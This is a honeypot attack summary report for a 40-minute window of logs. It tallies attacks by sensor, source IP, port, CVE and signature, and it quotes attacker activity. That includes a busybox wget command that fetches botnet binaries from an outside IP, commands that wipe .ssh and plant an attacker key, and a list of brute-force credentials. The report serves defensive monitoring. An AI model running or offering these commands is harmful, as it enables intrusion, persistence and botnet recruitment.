Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-23T15:01:57Z
**Timeframe:** 2025-10-23T14:20:01Z to 2025-10-23T15:00:01Z
**Files Used:**
- agg_log_20251023T142001Z.json
- agg_log_20251023T144001Z.json
- agg_log_20251023T150001Z.json

**Executive Summary**

This report summarizes 25,906 attacks recorded across three honeypot log files over a period of approximately 40 minutes. The most targeted services were Cowrie (SSH/Telnet), Honeytrap, and Dionaea (SMB). A significant portion of the attacks originated from the IP address 167.249.35.48. The most frequently targeted port was 445 (SMB), followed by port 22 (SSH) and port 5900 (VNC). Attackers attempted to install SSH keys, gather system information, and download malicious files. Several CVEs were exploited, with the most common being related to OpenSSL (CVE-2021-3449) and Microsoft FrontPage Extensions (CVE-2002-0013, CVE-2002-0012).

**Detailed Analysis**

**Attacks by Honeypot:**
* Cowrie: 8,466
* Honeytrap: 5,737
* Dionaea: 5,129
* Suricata: 2,717
* Ciscoasa: 1,688
* Heralding: 1,185
* Sentrypeer: 794
* Redishoneypot: 42
* H0neytr4p: 38
* Adbhoney: 30
* ConPot: 19
* Tanner: 17
* Mailoney: 20
* ElasticPot: 2
* Dicompot: 3
* Honeyaml: 6

**Top Attacking IPs:**
* 167.249.35.48
* 45.171.150.123
* 185.243.96.105
* 10.140.0.3
* 138.124.30.225
* 122.164.15.139
* 134.209.192.157
* 4.211.84.189
* 187.230.125.7
* 196.251.71.210

**Top Targeted Ports/Protocols:**
* 445
* 22
* vnc/5900
* 5060
* 1373
* 1368
* 1331
* 1334
* 1286
* 8086

**Most Common CVEs:**
* CVE-2021-3449
* CVE-2002-0013 CVE-2002-0012
* CVE-2020-2551
* CVE-2019-11500
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517

**Commands Attempted by Attackers:**
* cd ~; chattr -ia .ssh; lockr -ia .ssh
* lockr -ia .ssh
* cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
* cat /proc/cpuinfo | grep name | wc -l
* w
* uname -m
* cat /proc/cpuinfo | grep model | grep name | wc -l
* top
* uname
* uname -a
* whoami
* lscpu | grep Model
* df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
* free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
* ls -lh $(which ls)
* which ls
* crontab -l
* Enter new UNIX password: 
* cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...
* tftp; wget; /bin/busybox NLVVT

**Signatures Triggered:**
* ET INFO VNC Authentication Failure
* ET SCAN MS Terminal Server Traffic on Non-standard Port
* ET DROP Dshield Block Listed Source group 1
* ET SCAN NMAP -sS window 1024
* ET HUNTING RDP Authentication Bypass Attempt
* ET INFO Reserved Internal IP Traffic
* ET HUNTING Mozilla User-Agent (Mozilla/5.0) Inbound Likely Fake
* ET DROP Spamhaus DROP Listed Traffic Inbound group 28
* ET SCAN Potential SSH Scan

**Users / Login Attempts:**
* 345gs5662d34/345gs5662d34
* root/3245gs5662d34
* root/click.123
* root/clonne
* root/password$123
* root/Cloud1350
* ubuntu/!QAZ1qaz
* mcserver/server
* root/cmc123
* root/Root123456!

**Files Uploaded/Downloaded:**
* icanhazip.com
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass
* &currentsetting.htm=1

**HTTP User-Agents:**
* No user agents were observed in the logs.

**SSH Clients and Servers:**
* No SSH clients or servers were observed in the logs.

**Top Attacker AS Organizations:**
* No attacker AS organizations were observed in the logs.

**Key Observations and Anomalies**

* **High Volume of Automated Attacks:** The large number of attacks in a short period suggests automated scanning and exploitation tools.
* **Focus on Remote Access Services:** The high number of attacks on ports 22 (SSH), 445 (SMB), and 5900 (VNC) indicates a strong focus on gaining remote access to the honeypot.
* **Malware Downloads:** The `urbotnetisass` files downloaded from `94.154.35.154` are likely malware intended to compromise the system and add it to a botnet.
* **SSH Key Manipulation:** A common pattern of commands involves deleting the existing `.ssh` directory and adding a new authorized SSH key, which is a clear attempt to establish persistent access.
* **System Information Gathering:** Attackers frequently ran commands to gather information about the CPU, memory, and operating system, likely to tailor further attacks.
* **VNC Failures:** The "ET INFO VNC Authentication Failure" signature was the most frequently triggered, indicating a high volume of brute-force attacks against VNC services.
